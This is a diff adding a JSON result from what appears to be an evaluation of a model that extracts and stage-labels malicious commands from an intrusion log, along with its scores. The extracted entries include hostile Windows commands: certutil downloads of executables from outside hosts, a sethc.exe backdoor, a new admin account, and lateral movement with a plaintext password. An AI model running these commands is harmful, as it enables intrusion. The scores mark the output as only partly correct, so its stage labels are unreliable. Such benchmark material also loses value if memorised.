@@ -1,0 +1,107 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "winbrute administrator_pass.txt administrator",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "del /f /q winbrute.exe && del /f /q administrator_pass.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=Remote Desktop dir=in action=allow protocol=TCP localport=3389;reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server;REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe/",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f;",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net user nbb nb123. /add & net localgroup administrators nbb /add & echo [S] & cd & echo [E]",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "PAEXEC.exe \\\\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "PAEXEC.exe \\\\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The attackers started with an initial access phase where they downloaded the payload using certutil, then executed the payload, which led to privilege escalation through brute forcing admin passwords. They then implemented persistence mechanisms such as modifying registry entries and adding firewall rules. The next steps included lateral movement via creating new users and groups and executing remote commands. They also conducted collection activities such as downloading files using certutil. In summary, the attackers followed a typical cyberattack chain starting from initial access, escalating privileges, implementing persistence, conducting discovery, moving laterally, collecting information, and finally maintaining command and control.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 8436,
+      "completion_tokens": 853,
+      "total_tokens": 9289,
+      "wall_clock_s": 10.79,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35714285714285715,
+      "recall": 0.5555555555555556,
+      "f1": 0.43478260869565216,
+      "tp": 5,
+      "fp": 9,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.3333333333333333,
+      "f1": 0.2,
+      "tp": 2,
+      "fp": 12,
+      "fn": 4,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.14285714285714285,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 8436,
+      "completion_tokens": 853,
+      "total_tokens": 9289,
+      "wall_clock_s": 10.79,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
